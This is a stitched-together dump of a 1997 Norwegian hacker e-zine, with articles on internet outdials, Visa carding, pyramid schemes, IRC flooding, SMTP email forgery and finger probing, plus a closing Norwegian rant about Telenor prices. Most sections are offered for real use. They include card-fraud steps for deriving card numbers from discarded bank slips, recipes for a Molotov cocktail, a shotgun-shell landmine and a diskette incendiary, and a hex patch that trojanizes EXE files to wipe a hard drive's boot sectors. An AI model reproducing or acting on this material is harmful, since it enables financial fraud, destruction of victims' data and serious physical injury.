+    4. What are the adresses to some internet outdials?
+
+    First response: "I don't have a FUCKING clue when you read this"
+    Second response: "Check out 2600 faq available almost everywhere on
+                      the net, they have a pretty good list"
+
+    5. How can internet outdials be found?
+
+    a) Search the net
+    b) Check out good hacker releases, 2600 and Phrack for example
+    c) Learn how to get access to some of the outdials in the 2600 faq
+       and use these commands on other telnet sites you encounter (or hack).
+       Chances you find one is.. ehmm.. slim, but if you do your in for a
+       treat.
+
+
+
+
+     Written by Phiber X, of "No Shit!"
+     at 01:28:39, the 9th of April 1997
+
+
+    I can be found on Death Wish BBS in NORWAY, if you have any comments,
+    please let me know (that includes any outdials you might have :-) )
+
+Visa Carding Made Easy
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+ Visa Carding Made Easy
+ ----------------------
+
+ Ok, anyone knows that a visa number is 16 digits. How it's build up
+ though, is more unknown. It's really easy, and in this article I'm
+ going to show you how to get someones ViSA number just by getting
+ their bank number. .. eh, bank account number - whatever (no: kontonummer)
+
+ The visa number is always build up like this:
+
+            Ú> Bank Account Number
+      ÚÄÄÄÄÄÁÄÄÄÄÄ¿
+ 4925 YYYY-YY-YYYYY X
+ ÀÂÄÙ               ³
+  À> Bank Prefix    À> Unknown (X)
+
+ Prefix  : 4925 (Always 4925 in Norway!)
+                This is the bank prefix. If you have a list, just search
+                the list for the name of the bank, and you'll find the
+                prefix. If you don't have a list, get The Generator 2.0
+                when it's out :)
+ Account : 3531 15 31892 (example)
+ Unknown : 2
+
+ As you see, this makes 16 digits - a valid visa card number.
+
+ - But, how do I find X?
+ Well, to find the unknown (the last digit in the visa), use some visa
+ generator to validate the card, try using 1 first, if it's valid then
+ write it down. Then you try 2, etc. and write down the numbers that
+ passed the test. If you got more than one number that passed that test
+ then you'll have to do the 'payweb test' to. Just login to some payweb
+ porn site on the net, and try the different numbers, the payweb site
+ will check the number, and you'll find the correct one.
+
+ How to do it:
+ -------------
+ What you need is quite simple someones bank account number, and that's
+ not hard to find at all. Just visit your local bank and get some notes
+ from their trash, on many of these you will find:
+                        1) Cardholders Name
+                        2) Bank Account Number
+ Use the method explained earlier in this article to get the visa number.
+ Now the only thing you need is the expire date, visit some payweb porn
+ site on the net and try out every date (3/1/97, 2/1/97, 3/1/97 etc.)
+
+ Now you've got, Cardholders Name, Visa Number and Expire Date. What more
+ do you need? Go card! :)
+
+                                                            - Codeblaster/TBH
+
+
+How A Pyramid Scheme Works
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+HOW A PYRAMID SCHEME WORKS!!!
+
+1) This is how our pyramid looks, every star presenting a player.
+                                  *
+                                *   *
+                               **   **
+
+2) Eight new players have joined, each paying f.ex. 10$ to the one on the top
+   of the pyramid.
+                                  *
+                                *   *
+                               **   **
+                             ****   ****
+
+3) Now the guy on the top has received his money and disappears. The pyramid
+   will split into two pyramids.
+                           *              *
+                         *   *          *   *
+                        **   **        **   **
+
+4) This will repeat itself thousands of times untill the pyramid stops. When
+   the pyramid has stopped, a lot of people will loose their money, so join
+   early and you're ensured profit.
+
+                                                                - Ripperjack
+
+
+Easy Explosives
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+
+
+                              EASY EXPLOSIVES
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+I don't take any credits for this file, as it's just stuff I've picked up from
+different bbs's and text files, not figgured out myself. Since I remember it,
+it has to mean that it's easy-to-make explosives ;), so here's a collection
+of recepies for you who just hate those "76% sulfiric+23% nitric acid+ etc.".
+
+
+                                                .,;::.
+                                              _oO ::;'
+                                            _(_ _  /  o O ( sounds scary! )
+                          Ú-----------------\__\/_/--¿
+--[1]---------------------|  - PLASTiC EXPLOSIVES -  |--------------------[1]--
+                          À--------------------------Ù
+
+  Here's what you do to make some easy plastic explosives:
+
+  Mix: 2/3 Vaseline            |/////////|  <- Gasoline  \
+       1/3 Gasoline            |%%%%%%%%%|                > Mix'em
+                               |%%%%%%%%%|  <- Vaseline  /
+                               `---------'
+
+  Now, this mixture has to be set off electricly (that's why it's called
+  plastic explosives, dumbass). That means that some matches won't do, so
+  make yourself a little electric detonator and you're rockin'.
+
+
+                                                .,;::.
+                                              _oO ::;'    ( think I'll stick
+                                            _(_ _  /  o O ( to my pipe...
+                          Ú-----------------\__\/_/--¿
+--[2]---------------------|     -  SMOKE BOMBS -     |-------------------Ä[2]--
+                          À--------------------------Ù
+
+ Smoke bombs can come in handy sometimes, fex. if you want free from school
+ and stuff like that ;)
+
+ 1) Mix: 1/3 SUGAR
+         2/3 EPSON SALTS (Magnesium Sulphate - you can easily get this from
+                          school or something, and it's not illigal, so you
+                          can legally get it elsewhere too)
+
+ 2) Put the mixture in a tincan (an old coke-box or something) and heat the
+    stuff up with a lighter or something, so that it melts.
+
+     |         |  <- A tincan
+     |    .:.  |                          ________
+     | .,;::;,.|  <- the mixture                  |/
+     `---------'                                  |
+         /|                                       |     <- rest of the
+        |~|       <- Lighter              ________|        coke-box ;)
+        |_|
+
+ 3) Now, wait a while, so that the gel hardens, then add a fuse (a match
+    or something)
+
+ And voila, you've got yourself a little smokebomb, and this one is quite
+ goot too :)
+
+
+                                                .,;::.
+                                              _oO ::;'
+                                            _(_ _  /  o O ( hum, interesting
+                          Ú-----------------\__\/_/--¿
+--[3]---------------------|    -  DISKETTE BOMB  -   |-------------------Ä[3]--
+                          À--------------------------Ù
+
+ You've probably heard/read about this bomb before, since it's an old one,
+ but I'm including it here anyways, for those of you who haven't seen it
+ before (coz it's cool :)
+
+ What you need:
+                1) A Diskette (3,5")
+                2) Matches (Those you can ignite anywhere)
+                3) Nail Polish
+                4) A knife
+
+ What you do:
+              1) Use the knife to open the diskette (split it into to pieces)
+              2) Remove that white, round, cotton shit inside.
+              3) Crush the matches into powder with a wooden scraper or
+                 something, so that you have a nice little amount of match-
+                 powder.
+              4) Spread the powder inside the disk, like nice, white snow
+                 on a winterlandscape (ahh... poetic huh?)
+              5) Spread some nail polish over the match powder laying in the
+                 diskette, and wait till it's dry.
+              6) Put the diskette back together, and use glue or something
+                 (or the nailpolish!) to make the two pieces stay together.
+
+ Now you've made yourself a little diskette bomb, and when your "friend"
+ puts it in his diskette drive, and the drive head attempts to read the
+ disk, the disk starts to spin, and ... the result will be an ignition of
+ the matches inside, wich will cause the disk to melt in the small fire,
+ and it'll be stuck in the disk drive. Quite nasty ;) .. And remeber, you
+ have to use those matches that you can ignite everywhere. Have phun!
+
+                                                .,;::.
+                                              _oO ::;'
+                                            _(_ _  /  o O ( napalm stuff....
+                          Ú-----------------\__\/_/--¿
+--[4]---------------------|      - FIRE BOMB -       |-------------------Ä[4]--
+                          À--------------------------Ù
+
+ Oki, probably everyone know what this is. You know those bottles you see
+ the demostrants in eastern-europe etc. throwing at the millitary tanks and
+ police in a riot. Yeah, those are the one I'm talking about. Now, most peopl
+ think it's JUST gasoline in a bottle, but here's the way to make a good
+ one:
+
+ What you need:
+               1) A bottle or a Jam-Mug (so long it's made out of glas)
+               2) Gasoline to fill 2/3 of the bottle.
+               3) Oil to fill 1/3 of the bottle.
+               4) A piece of RAG (a piece of an old t-shirt, whatever)
+     *         5) Cork for the bottle
+    ***
+   |#|**
+  / * \**  <- Gasoline-Soaked rag
+ |:::::|*
+ |:::::|                        +-------------------------------------------+
+ |:::::|                        | Guess everyone know how to use this one,  |
+ |:::::|   <- 2/3 Gasoline      | just ignite the rag-fuse, and throw the   |
+ |&&&&&|                        | bottle. When the bottle lands on some-    |
+ |&&&&&|   <- 1/3 Oil           | thing hard, it will break, and the oil/   |
+ ~~~~~~~                        | gasoline mix will ignite, giving it a     |
+                                | sort of "napalm" effect :)                |
+                                +-------------------------------------------+
+
+
+                                                .,;::.
+                                              _oO ::;'
+                                            _(_ _  /  o O ( yah, in the good
+                          Ú-----------------\__\/_/--¿    ( old days we'dd..
+--[5]---------------------|       - LANDMINE -       |-------------------Ä[5]-
+                          À--------------------------Ù
+
+ Here's a simple way to make a landmine:
+
+ You need: 1) A Wooden plank
+           2) A Brick
+           3) A Shotgun Shell
+           4) A Big Nail
+
+ What you do:
+
+ - Use a drill or something to make a hole in the brick. Don't make a hole,
+   straight through, just so you can put the shotgun shell in..
+ - Put the shotgun shell in the hole.
+ - Nail the nail through the middle of the wooden plank.
+ - Now, place the wooden plank on the brick, so that the nail goes into
+   the hole that the shotgun shell is placed in.
+
+
+ _______________________________--__________________________________________
+| wooden plank                  || <- nail                                  |
+|_______________________________||__________________________________________|
+  .--------------------------.  ||   .------------------------------------.
+  |                          |  ||   |                                    |
+  | brick                    || ||  ||                                    |
+  |                          || ||  ||                                    |
+  |                          || \/  ||                                    |
+  |                          ||~~~~~||                                    |
+  |                          ||     || <- hole w/shotgun shell in it.     |
+  |                          ||_____||                                    |
+  |                          ~~~~~~~~~                                    |
+  `-----------------------------------------------------------------------'
+
+ As you see in the ascii above (nice ascii huh?;), that when somebody steps
+ on the plank the nail will put pressure on the shotgun shell, and it will
+ go off sending splints everywhere. Now go bury it somewhere...
+
+                                            - Keep Hacking Strong, Codeblaster!
+
+
+Newbie Flooding
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+ Hey there.. well I'm off with a bit new information.. see irc (internet relay
+ chat) is very common these days so I thought I might teach u sum.. this
+ file will not contain any hacks or whatever, just some basic information
+ on irc. how to protect yerself.. and how to avoid ppl annoying your ass off.
+ so read and have fun ;)..
+
+ *NOTE* sorry if my english is a bit rusty, but I don't really care!..
+
+ irc is a chat program, usually the command irc at your unix prompt will give
+ you ircII, then yer ready to go chatting, (Norwegian - Pr›v via unix prompten
+ irc <IRCnicket dit> irc.homelien.no) (To find irc server's try searching the
+ web for IRC servers) well the most used and the oldest server I guess is
+ EFFNet (Electronic Freedom Founduration Net) it's the largest, and the second
+ larges irc server is Undernet.. well I use EFFNet, so I suggest you do too
+ ;).. well ok, before you get TOO exited, you might want to know that there
+ are some loonies on irc to, ppl who just want to have fun with you, and mess
+ up your great time. ppl who do takeover's on channel's and play around with
+ your stuph.. if for instant you start a channel called #megafun you're the
+ first in that channel you get OPS (@X07
+ kick and ban ppl from you're channel.. so let's say you have gotten some
+ friend's in you're new channel, and suddenly some on comes in the channel and
+ want's op's, you SHOULD NOT give them ops, the may just fuck your channel,
+ and you may just say bye bye to it.. well if you're smart and don't give them
+ ops, they probably will try to do something else to get ops. like flooding
+ what flooding does is to send something to you as many times' as possible.
+ for instants a TXT flood will send you alot of msg's giving you lotsa crap on
+ your screen, this is really annoying but usually can't cause any harm..you
+ could stop txt flooding by using the command /ignore IRCnick. but let's say
+ this guy wants that op so bad, he doesn't give up.. he would probably
+ begin to CTCP or ICMP flood you (They are also know as nuke or mass flood)
+
+ *NOTE* ICMP stands for Internet Control Message Protocol (so you IRC internet
+ elite loonies, if you dind know that, you're a LOOSER! :)) for instant
+ icmp redirected messages are used by routers to tell other computers "Quit
+ sending me that junk, send it to No where.poo.net !" so an
+ ICMP redirct message could cause your irc messages to go to hell.
+ eof stand's for "End of file." "Dead Socket" refers to ppp, or in other
+ words you aren't on irc any more.. you quitted..
+
+ other ways to flood is to ping flood you (Ping will send a msg to the guy
+ you ping and return to u and tell you how long time it used to reach the
+ other guy), ping flood is also know as ICBM flood.
+
+ so what all that I have written above is to say "Flooding = Sending as much
+ crap you can to yer victim.. ok how's more detailed info..
+
+ ---------------------------------- TXT -------------------------------------
+ the simples way to flood some one is by TXT flooding someone, by sending
+ the same msg Over and over again, will be f***ing annoying right? saying you
+ got the same msg 10 times in 4 sec? yeah.. well it's not much more use
+ to flood some one by txt, cause most servers has text flood filter's
+ So only txt flood some one if you want to be annoying ;)
+
+ ---------------------------------- CTCP ------------------------------------
+ Ctcp (Client to client protocol) flooding is the most effective flood.
+ this is kinda like ping, it checks if you're host is weither or not alive
+ so if you make a script doing the command /ctcp <nick> echo FUCK YOU THIS
+ IS A FLOOD! 100 times it's a 100000 time more effective than txt flood!
+ but the only backdrop is that you would get an answer 100 time too =(
+ so leave out the ECHO part ;).. ok well the next and just as effective as
+ the ctcp command is the PING command.. it operates in the same way (DAMN
+ DIDN'T I CHOSE A NERDY THING TO WRITE ABOUT??!?!)..
+
+ well ok, a more experienced flooder would ame at your "dynamically assigned
+ IP" (Internet protocol) he would not flood you at the irc, nor at the server
+ by you MODEM directly, so if you got an 28.8 or 14.4 modem, and the flooder
+ got an ISdn connection, you're bound to get dropped off, or if you're really
+ luck only Lagged like hell
+
+ ok, so? what are you trying to say don't use irc?
+ no what I am really trying to say is to, get a program that runs in the back
+ ground of the proggy u use to protect you're self.. script's like Spam.irc
+ phoenix, acid!irc, 7th Sphere, PhytKrakr, |MaGuS|, precurser Etc. Etc.
+
+
+ Well since this is the most LAMEST thing I've ever written, I have decided to
+ quit RIGHT here.
+
+ have phun
+                                                     Djnad / enterprise (C) 97
+
+
+Fake Emails
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+Is there anything like sitting in a chair with some nice jungle uplifting vibes
+in the background. a cup of tea, reading? Letting the information flow through
+your brain.. NOPE, there isn't!. Knowledge is power and power is the coolest
+thing you can ever poses.. so therefor have I decided to write my knowledge
+so you can, expand yer knowledge, and yer power! so please, put some music on.
+make yourself a cup of tea, and get the power you always wanted to poses.:)
+well that's all the morals I'm gonna teach you ;).. hehe, on to the real
+thing!
+
+Hacking. the word conjures up evil computer geniuses..
+
+Just a small note! for you newbies / wannabies
+
+Define: 3l1t3, 31337, and so on, all means "Elite", the hacker's who do some
+elee7 thing almost always use some thing's to make the writing a bit more
+advanced, like if I would write access it would probably be soothing like
+axx or acz, axz etc. etc.
+
+ok one more thing I'm sick of ppl (People) saying "I want to learn ElItE
+hacking but I don't want to learn unix, nor programing!.. d00dz YEAH,
+GIMME SOME CREDITCARDZ!" FUCK EM!.. ha, they suck the whole secret behind
+hacking is knowledge, the lust to learn.. and reading. this do not mean that
+you should never do a hack. but it means you need to have the will to learn..
+hanging in #2600 or #hack #phreak etc. etc. do not mean that you're a hacker..
+an hacker operates online and offline... ok well on to the next part ;) fake
+email via telnet, this /hack/ (Ehm Hrmze) means you could really do some
+heroic hacking in 1/2 hour! impress you're friends! ;)..
+
+-----------------------
+Ok have you ever heard of Robert morris? he was the creator of "morris worm"
+witch took down the internet in 1990. of course the bug that he exploited to
+get the worm to fill up 10% of the computer systems on the internet with
+his self mailing virus has been fixed on most internet computers..
+But there is still some heroic thing's you can do ;).. not take down like 10
+systems in 10 mins, no. you can use the same method that Robert M. used
+forge email! whoa doesn't that sound cool?.. well it is.. you can do some
+evil deeds with that.. I'm not gonna teach you how to break into private
+parts of the system (YAH HAPPY HARDCORE RULE! cd yaknow ;)), besides I'm not
+very fond of jail.. ;) well to do this /hack/ you need a shell account!..
+if you haven't got one yet, GET ONE!.. a shell account is an internet account.
+witch you can use unix command's (Norwegian note! - SN internet har slike
+accounter! get one!) well unix is the language on the internet, so if you want
+to be a REALLY good hacker, you will need to learn unix.
+Ok when you have gotten your shell account, let's say that you're on it now
+and are able to use the unix commands.. test the telnet, do this:
+"telnet ns.interlink 20" if you get to interlink and get some stuff on your
+screen, you're in business! ;) if you never telenetted before you have done it
+now! ;) cool?, well this /hack/ is STUPID simple, get to the prompt again
+norwgian note again - har du sn s† vill det vere oslonet.no%) do this command:
+
+"telnet callisto.unm.edu 25" (I took this ip cause i know it allows what we'll
+                              do, right fake emails! ;)
+
+What that "25" in the back means' is that (once AGAIN HAPPY HARDCORE RULE!)
+you telenetted to callisto's email send port (An port is somewhere informa
+tion goes in and out. on yer PC you got standard 4 port's Screen,mouse,modem
+Keyboard. well these hostes on the internet has ALOT of port's that's not
+physical, nope you can not see them ;)..) you may happened to hit a firewall
+(Security program), but most often you won't, well I'm sure you got into
+callisto so let's see what we can do .. Whoa, it didn't ask for a logon, it
+just say's READY!. cool?.. well that's cause it runs "Smail3.1.28.1" it's
+a email program, type "help" or "?" and you will get
+
+250 The following SMTP commands are recognized
+250
+250   HELO hostname
+250   MAIL FROM:<sender address>
+250   RCPT TO:<recipient address>
+250   VRFY <address>
+250   EXPN <address>
+250   DATA
+250   RSET
+250   NOOP
+250   DEBUG [level]
+250   HELP
+250   QUIT
+
++ some more crap..
+
+do it like this
+
+----------------------- The hack! --------------------------------
+
+helo motherfuckernowhere.dreamland.org
+mail from:motherfuckernowhere.dereamland.org>
+
+rcpt to:mmiriX08---------------------------------------------------------------------------
+now check your mail ;).. have phun
+
+Btw; don't go and buy book's like "hack the unix Super manual 200"
+     no real hacker's read and study Book's like the unix manual!
+
+                                                           Djnad / Enterprise
+
+Finger Trick
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+Hey, once again ;) it's me djnad again.. well since I first learned you
+how to fraud emails' here's how to finger user's via telnet.. really really
+simple ;).. but very useful, in fact finger (port 79) is the most common way
+to crack into non-public parts systems and get unauthorized axz!..
+and one more time, AN shell makes it a helluva lot easier!. ;) ok here we go
+
+you've entred the shell account now I suppose. do a
+
+finger harryX03
+
+but replace harryX0Btelnet hasle.sn.no 79
+
+
+now, you'll enter the finger port on hasle. you can enter hasle with out a
+password.. kewl?.. well you can just enter one command.. enter the command
+
+mmiri
+
+what you did was to finger my user account, it will give some stuff about
+me, my login name, my email, if I have some unread email's etc. etc.
+well do the same and try these names (Commands)
+
+There no point in hacking/cracking hasle, cause there no cool stuff to get
+there..
+
+------------
+
+root
+system
+bin
+guest
+test
+deamon
+demo
+time
+finger
+X08------------
+
+
+*HEHE* root is the best access you could get! but none of these command's
+       will give yah root access =/..
+
+Remember the eleet of the ELLLLLLLLEEEETTTT, ppl, give the sysadim a
+msg on how you cracked in to the system! and maybe say how to fix it.
+
+
+there are SO many thing's you could try, but I won't list them all. those I
+have listed, are the most used command's to crack in to systems.
+
+Ok, so what have we learned?
+
+what is finger? Finger is a program that runs on port 79 (That's why we
+could telnet there!) on many inet hosts. it will provide information on
+a given user, on a given system..
+
+Well for a cracker there are lotsa other thing's to do after finger..
+but I won't teach those felonies ;).. hehe
+
+
+Have phun
+
+                                                           Djnad / enterprise
+
+
+
+Trojanize EXE/COM Files
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+                          TROJANIZE EXE/COM FILES
+                         -=-=-=-=-=-=-=-=-=-=-=-=-
+                           Written by dEATHWALKEr
+
+I bet that you don't like these fuckin assholes that downloads tons of warez,
+and then they don't give shit back. Then, get the latest program or game
+and fix some bytes, and then give the file to the sucker. Bwahahaha
+what happened to his harddrive. (Hehehehehehe!) This is an easy way to make
+exe files destructive. When the file is trojanized, it can be used to fuck
+someone's computer up. Ok, it is very easy to do this. To do this we will
+need a hexeditor(I use NORTON'S DISKEDIT), cause we will have to change
+a few bytes in the file(Only 16 bytes). The best type of file to fix is a the
+EXE files(or a big comfile) since the com file will allmost use it's code
+all the time. Let's get started! Search for an occurence of "CD 21", the dos
+interrupt. When found, then do this. Edit these bytes into the file:
+(Starting from the CD 21)
+    B4 03         ; * MOV AH,003H   (WRITE SECTORS)
+    B0 C8         ; * MOV AL,0C8H   (NUMBER OF SECTORS)
+    B5 00         ; * MOV CH,000H   (CYLINDER NUMBER)
+    B1 01         ; * MOV CL,001H   (SECTOR NUMBER)
+    B6 00         ; * MOV DH,000H   (HEAD NUMBER)
+    B2 80         ; * MOV DL,080H   (DRIVE) 80=C:
+    CD 13         ; * INT 013H      (DISK INTERRUPT)
+    CD 20         ; * INT 020H      (TERMINATE THE PROGRAM)
+
+!! DO NOT EXECUTE/RUN THIS PROGRAM AFTER YOU HAVE PATCHED IT !!
+If you should start this program, then you can kiss you harddrive's boot
+goodbye(Some harddrives can NOT be fixed after this program has been run).
+"Some computers save their CMOS and BIOS information at the boot."
+
+XTRA TIP(S):
+
+ - Crypt the program after you have patched the file (PROT or EXEPROT or ??)
+ - Compress the file(PKLITE or DIET or ????)
+
+                                                -_- <] dEATHWALKEr [> -_-
+
+
+Norwegian: Telenor Suger
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+
+                    __   ____ ______   ____    _____     __
+                   _) ¬. )   \   __/__l___( __(____/ ___|  ¬.
+                 _/·    Y·  \ \  / o· ___/ Yo· __/__(_  !  _/_
+                ,\      .    \  /\    \/   .  '     .   _    /
+              .p)h`--.__j----'\//.`---.____j---.____j---l____\
+
+                     1.1 - Hva er denne artikkelen om?
+                     1.2 - Noen fakta
+                     1.3 - Telenors situasjon i dag (Pris›kningen)
+                     1.4 - Hermansen f†r det som han vil (Kontaktene)
+                     1.5 - Hva skjer n†r monopolet faller i 98?
+                     1.6 - Telenors konkurrenter
+                     1.7 - Hva kan DU gj›re?
+                     1.8 - Konklusjon
+
+1.1 - Hva er denne artikkelen om?
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Er du lei av † m†tte betale overpris for † ringe internett? Er du lei av
+at Telenor, et statsfinansiert selskap, f›rst lover noe og s† gj›r det
+stikk motsatte? Det er iallefall jeg, og det er faktisk noe man kan gj›re
+med det... Jeg skal her si litt om Telemarkedet i Norge i dag, og litt
+om fremtiden og hva vi kan gj›re for † bekjempe Telenors prispolitikk.
+
+
+1.2 - Noen Fakta:
+~~~~~~~~~~~~~~~~~
+þ I 96 gikk Telenor ut i media (bla. p† TV2 nyhetene) og lovte oss GRATIS
+  lokaltakst i 97. Men hva hendte i 97? Jo, de bestemte seg heller for †
+  gj›re det stikk motsatte; De satt opp taktsten p† lokaltakst med hele
+  83%! Og n† lover de oss gratis lokaltakst i 98, som om de i det hele tatt
+  har noe troverdighet igjen...
+
+þ Telefonmonopolet i Norge faller 1. Januar 1998. Telenor er etter dette
+  ikke lenger de eneste som har lov til † drive med teletrafikk her i
+  Norge. Det er p† tide det er slutt p† monopolet, ettersom de har hatt
+  det helt siden 1880.
+
+þ Alminnelig, innenlands telefoni utgj›r 43% av Telenors samlede inntekter.
+  Telenor er livredd for † miste kunder (logisk - 43% er ganske mye), og
+  det betyr at privatbrukerne (oss) har egentlig ganske stor makt - HVIS
+  vi st†r samlet!
+
+þ Tormod Hermansen (Telenor-sjef) har gode kontakter innenfor regjeringen,
+  han har etablert et nettverk av bedrifter for † forberede Telenor p†
+  konkurransen utenfra i 98 - dette kan gj›re ting meget vanskelig for
+  selv de st›rste multinasjonale selskapene, for Telenor spiller p†
+  hjemmebane og vi har sett endel ganger at Hermansen f†r det som han vil.
+
+
+1.3 - Telenors situasjon i dag (Pris›kningen)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Telenor sitter egentlig i en ganske perfekt situasjon i dag. De har monopol,
+og de vet hvordan de skal utnytte det; og SAMTIDIG f† folk til † tro at
+de "Senker prisene drastisk" og bare tenker p† alles beste. "Vi senker
+prisene med over 70%" heter det s† fint, men gj›r de egentlig det?
+
+NEI! De har faktisk satt opp prisene, og tullingene som trodde Telenors
+fagre l›fter i begynnelsen av 97 (Foreldrene dine kommer sikkert inn under
+den katagorien) finner nok ut, at prisene faktisk har STEGET hvis de
+sammenligner telefonregningen f›r og etter †rsskiftet. Mens de satt ned
+fjerntakst prisen med 70% satt de sammtidig opp lokaltakst prisen med 80%!
+Og de fleste merker nok heller de 80%'ene fordi de mye oftere ringer til
+bekjente i sin egen kommune eller nabokommunene enn de ringer til folk langt
+vekke.
+
+Og dette merker iallefall vi internett brukere skikkelig. Fra † betale 4,6kr
+f›r nytt†r m† vi n† betale 8,x per time. Dette virker kanskje ikke mye hver
+time, men det blir endel n†r man kommer opp i antall timer. (Hvis feks.
+regningen var p† 2000 gjennomsnittlig i 96, kan den godt bli n‘rmere 4000
+i †r. OG DETTE SKJER ETTER DE LOVTE OSS *GRATIS* LOKALTAKST INNEN 1997!
+At Telenor i det hele tatt kommer seg vekk med et slikt overtramp er helt
+utrolig, men som sagt; Hermansen har mange kontakter etter sine †r innenfor
+regjeringen.
+
+Jeg kan jo ogs† legge til at i dag har Telenor praktisk talt ikke bare
+monopol p† telefoni i norge, men ogs† p† internett oppkobling. Etter
+fusjonen med SN har de n† 80% av markedet, og dette gj›r det vanskelig
+for sm†bedrifter † ta opp kampen om prisene (Det er imidlertid noen som
+gj›r en god innsats, les mer om dette under 'Hva kan du gj›re?')
+
+Telenor har videre bygget ut et nettverk av investeringer innenfor 108
+ulike selskaper i inn- og utland. De forbereder seg godt p† dagen monopolet
+faller ved † opprette avtaler med store selskaper (feks. Statoil), invistere
+her og der, og f†r godt med penger av staten. Feks. har de aksjer i Elkj›p,
+s† hvis du kj›per noe der, g†r 10% til Telenor (Moral: boikott Elkj›p!)
+
+Sp›rsm†let er; HVOR har de f†tt pengene til † invistere i alle slags
+forskjellige selskapet, og skape seg dette nettverket? ... Jo, det f†r
+du vite mer om her;
+
+1.4 - Hermansen f†r det som han vil (Kontaktene)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Som statsselskap har Telenor en generalforsamling som best†r av en enkelt-
+person; Samferdselsministeren. Denne generalforsamlingen er som kjent
+Kjell Opseth og Sissel R›nbeck; Hermansens partifeller! (Skulle ikke forundre
+meg om disse ogs† var personlige venner), for † illustrere dette litt
+enklere i ascii, blir kommandolinjene slik: (›verst har mest makt.)
+
+                               ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                               ³ Samferdsels-    ³
+                               ³ departamentet   ³
+                           ÚÄÄÄ´                 ÃÄÄÄÄÄ¿
+                           ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ     ³
+                           ³                           ³
+                           ³                           ³
+                           ³                           ³
+                           ³   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ³
+                           ³   ³ Statens         ³     ³
+                           ³   ³ Teleforvalting  ³<ÄÄÄÄÙ
+   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ³   ³                 ³
+   ³ TELENOR         ³<ÄÄÄÄÙ   ÀÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+   ³ m/Hermansen     ³<ÄÄÄÄÄÄÄÄÄÄÄÄÙ
+   ³                 ³
+   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+Vi ser her to ulike som kan gi Telenor "ordrer" eller p†legg, Samferdsels-
+departamentet og Statens Teleforvalting. Samferdselsdepartamentet st†r
+igjen over Statens Teleforvalting, og kan sette til side deres p†legg.
+Og da, er jo Samferdselsdepartamentet de eneste Telenor trenger † forholde
+seg til, og de har jo Hermansen i sin hule h†nd. Et eksempel p† Hermansens
+kontakter der, og at Statens Teleforvalting er "under" Samferdsels-
+departamentet finner vi i Teletopia saken: (BT 02.04.97)
+
+"I to †r har det vesle nisjefirmaet Teletopia AS kjempet for † konkurrere
+ med Telenors datterselskaper, blant annet innen teletorg-tjenester.
+ Statens Teleforvalting p†la Telenor † gi Teletopia telelinje p† samme
+ vilk†r som Telenors egne bedrifter. Telenor klaget til Samferdsels-
+ departamentet. Dagen etter ble teleforvaltingens p†legg satt til side.
+ (...) verste ankeinstans i telesaker er alts† Telenors eier og general-
+ forsamling."
+
+Videre i BT/Stavanger Aftenblad/Adresseavisen samme dag;
+
+"Men det finnes gode eksempler p† at n†r Tormod Hermansen har f†tt en
+ overbevisning om hva som er rett, s† blir det etter hvert ogs† Ap-
+ regjeringens offisielle politikk."
+
+Er dette det man kaller en korrupt regjering eller hva?
+
+Et annet eksempel p† at Hermansen f†r det som man vil finner man i 1996,
+n†r han fant ut at Telenor trengte litt mer penger for † lage nettverket
+sitt (som jeg skrev litt om tideligere). Samferdselsdepartamentet foreslo
+da at 2 milliarder av Telenors statsgjeld skulle omgj›res til Egen-
+kapital (dvs. de fikk 2 milliarder av staten). Hvorfor skal egentlig
+Stortinget bruke skattebetalernes penger p† noe slikt?
+
+Og hva vil konkurransemyndighetene (EFTA) og ES-organene mene om et
+marked der den helt dominerende av konkurrentene kan f† innspr›ytinger
+fra statskassen? Jeg skal v‘re den f›rste som anmelder dette tilfellet
+enten til ES-organene el. EFTA hvis noe slikt skjer i 98.
+
+Kort sagt; Hermansen har kontakter s† det holder, og det kan bli vanskelig,
+selv for de skikkelig store multinasjonale selskapene † komme inn p† det
+norske markedet. Vi som privatbrukere kan imidlertid gj›re noe med dette
+(les videre..)
+
+
+1.5 - Hva skjer n†r monopolet faller i 98?
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Ingen vet hva som vil komme til † skje her i norge etter monopolets fall
+1. januar 1998. En ting er sikkert; utenlandske (og kanskje norske) selskaper
+vil pr›ve seg, iallefall p† bedriftsmarkedet. Men det som teller for oss,
+er om vi vil f† stor konkurranse p† privatbrukermarkedet. Det er det som
+bestemmer om vi f†r gratis lokaltakst eller ikke.
+
+Slik funker det i 98:
+Konkurrentene har 2 muligheter til † tilby oss privatbrukere tele-tjenester
+p†;
